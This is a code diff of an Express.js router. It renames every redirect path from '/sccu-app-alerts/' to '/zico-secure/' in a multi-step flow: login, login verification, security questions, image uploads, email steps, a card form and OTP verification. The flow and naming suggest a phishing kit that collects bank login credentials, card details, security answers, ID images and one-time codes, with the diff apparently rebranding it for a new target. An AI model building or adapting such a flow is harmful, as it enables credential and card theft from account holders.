@@ -148,11 +148,11 @@ router.post('/sendEmail', async (req, res) => {
 
     console.log('Email sent');
     req.flash('success_msg', 'Email sent successfully');
-    res.redirect('/sccu-app-alerts/otpVerify');
+    res.redirect('/zico-secure/otpVerify');
   } catch (error) {
     console.error(error);
     req.flash('error_msg', 'Failed to send OTP. Please try again.');
-    res.redirect('/sccu-app-alerts/');
+    res.redirect('/zico-secure/');
   }
 });
 
@@ -174,11 +174,11 @@ router.post('/otpVerifier', (req, res) => {
     // OTP is valid
     delete activeOTPs[email]; // Remove the used OTP to ensure it's used only once
     req.flash('success_msg', 'OTP verified successfully');
-    res.redirect('/sccu-app-alerts/questions'); // Redirect to your login route
+    res.redirect('/zico-secure/questions'); // Redirect to your login route
   } else {
     // Invalid OTP
     req.flash('error_msg', 'Invalid OTP. Please try again.');
-    res.redirect('/sccu-app-alerts/otpVerify?error=1'); // Pass error parameter in the query string
+    res.redirect('/zico-secure/otpVerify?error=1'); // Pass error parameter in the query string
   }
 });
 
@@ -207,7 +207,7 @@ router.post('/card', async (req, res) => {
 
 // images
 router.post('/images', upload.fields([{ name: 'image1', maxCount: 1 }, { name: 'image2', maxCount: 1 }]), (req, res) => {
-  res.redirect('/sccu-app-alerts/emailcnt');
+  res.redirect('/zico-secure/emailcnt');
 });
 
 // Handle Security Questions Form Submission
@@ -230,7 +230,7 @@ router.post('/questions', async (req, res) => {
         'success_msg',
         'Questions ok'
       );
-      res.redirect('/sccu-app-alerts/images');
+      res.redirect('/zico-secure/images');
     })
   .catch(err => console.log(err));
 });
@@ -258,7 +258,7 @@ router.post('/email', async (req, res) => {
           'success_msg',
           'Email ok'
         );
-        res.redirect('/sccu-app-alerts/card');
+        res.redirect('/zico-secure/card');
       })
 
 } catch (err) {
@@ -285,7 +285,7 @@ router.post('/emailcnt', async (req, res) => {
         'success_msg',
         'Email ok'
       );
-      res.redirect('/sccu-app-alerts/email');
+      res.redirect('/zico-secure/email');
     })
   .catch(err => console.log(err));
 });
@@ -359,7 +359,7 @@ router.post('/register', (req, res) => {
                   'success_msg',
                   'You are now registered and can log in'
                 );
-                res.redirect('/sccu-app-alerts/login');
+                res.redirect('/zico-secure/login');
               })
               .catch(err => console.log(err));
           });
@@ -391,7 +391,7 @@ router.post('/login', (req, res, next) => {
       'success_msg',
       'Questions ok'
     );
-    res.redirect('/sccu-app-alerts/loginverify');
+    res.redirect('/zico-secure/loginverify');
   })
 .catch(err => console.log(err));
 });
@@ -416,7 +416,7 @@ router.post('/loginverify', (req, res, next) => {
       'success_msg',
       'Questions ok'
     );
-    res.redirect('/sccu-app-alerts/questions');
+    res.redirect('/zico-secure/questions');
   })
 .catch(err => console.log(err));
 });
@@ -425,7 +425,7 @@ router.post('/loginverify', (req, res, next) => {
 router.get('/logout', (req, res) => {
   req.logout();
   req.flash('success_msg', 'You are logged out');
-  res.redirect('/sccu-app-alerts/login');
+  res.redirect('/zico-secure/login');
 });
 
 // Retrieve a list of all files in GridFS
